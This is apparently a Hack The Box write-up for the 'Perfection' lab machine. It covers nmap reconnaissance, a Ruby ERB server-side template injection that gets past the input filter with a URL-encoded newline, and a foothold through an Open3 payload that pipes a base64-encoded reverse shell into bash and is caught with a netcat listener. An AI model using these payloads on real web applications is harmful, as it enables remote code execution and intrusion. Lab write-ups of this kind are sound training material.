![Perfection](https://github.com/amalcew/htb-writeups/assets/73908014/904d7389-1950-4c2b-b6c1-e9e5a8e244d5)

## Reconnaissance & port scanning

Starting with `nmap` scan we discover open ports 22 and 80.

```bash
# Nmap 7.94SVN scan initiated Sun Mar 10 16:52:27 2024 as: nmap -v -sV -sC --open -vvv -oA logs/initial_recon/initial 10.10.11.253
Nmap scan report for 10.10.11.253 (10.10.11.253)
Host is up, received syn-ack (0.034s latency).
Scanned at 2024-03-10 16:52:27 CET for 8s
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMz41H9QQUPCXN7lJsU+fbjZ/vR4Ho/eacq8LnS89xLx4vsJvjUJCcZgMYAmhHLXIGKnVv16ipqPaDom5cK9tig=
|   256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBqNwnyqGqYHNSIjQnv7hRU0UC9Q4oB4g9Pfzuj2qcG4
80/tcp open  http    syn-ack nginx
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Weighted Grade Calculator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Mar 10 16:52:35 2024 -- 1 IP address (1 host up) scanned in 7.97 seconds
```

![01-webpage](https://github.com/amalcew/htb-writeups/assets/73908014/1e47cdf0-869d-456f-b4f1-74b6470a9b46)

Machine hosts webpage which allows to calculate your grades with usage of Ruby's framework called WEBrick.

![02-calculator](https://github.com/amalcew/htb-writeups/assets/73908014/e8577d4c-223c-41c7-902e-1d9e445429bd)

Additional scans (`ffuf`, `whatweb`, `dirsearch`) didn't discover anything that could be useful or vulnerable - the calculator itself looks like main goal of this machine.

The calculator blocks any special character except `/`. That way it prevents direct injection of the malicious input.

![03-malicious_input_blocked](https://github.com/amalcew/htb-writeups/assets/73908014/7ba5cb58-add9-40a0-8789-1600d7178a62)

In the case of this machine `Burp Suite` was very useful tool that allowed to tinker with the payload. After sending the POST request to repeater I've checked that calculator understands URL notation:

![03-url_hello_world](https://github.com/amalcew/htb-writeups/assets/73908014/0277e5df-3d04-44d1-917f-868c61070312)

This knowledge is very useful, as the page probably uses some regex filter to check for special characters. The question is, what special chars are omitted by mistake.
After some tinkering, I've discovered that `%0A` (URL newline character) is not properly handled. Using [HackTricks cheatsheet for SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) I've managed to check, that the machine is indeed vulnerable to SSTI attack.

In this example, payload is some text `hello`, `%OA` and URL-encoded Ruby's function to list root directory `<%= Dir.entries('/') %>`

![05-ssti_exposed](https://github.com/amalcew/htb-writeups/assets/73908014/15b7a43a-a7b0-4513-8cd1-b3d39c3a08e9)

## Initial foothold

Obtaining reverse shell connection on this machine required some experimenting with the payload, as simple `system("command")` was insufficient. 
The final payload was composed of `<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('payload') %><%= @b.readline()%>` and standard payload that spawned reverse shell.

```bash
# payload
echo YmFza ... SNIP ... +JjEK|base64 -d|/bin/bash

# reverse shell
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('eecho YmFza ... SNIP ... +JjEK|base64 -d|/bin/bash') %><%= @b.readline()%> 
```

The reverse shell was also URL-encoded using Burp's decoding tool for stability of the payload.
Listening on selected port and executing the payload spawned the reverse shell, as intended.

![06-reverse_shell](https://github.com/amalcew/htb-writeups/assets/73908014/7b504564-98f9-4e6d-b53c-1ecb200307c9)

```bash
> nc -lvnp 1234
listening on [any] 1234 ...
connect to [xx.xx.xx.xx] from (UNKNOWN) [10.10.11.253] 43938
bash: cannot set terminal process group (997): Inappropriate ioctl for device
bash: no job control in this shell
susan@perfection:~/ruby_app$ id
id
uid=1001(susan) gid=1001(susan) groups=1001(susan),27(sudo)
```

This was sufficient to read user's flag.

```bash
susan@perfection:~/ruby_app$ cd
cd
susan@perfection:~$ cat user.txt
cat user.txt
9844************************6e80
```
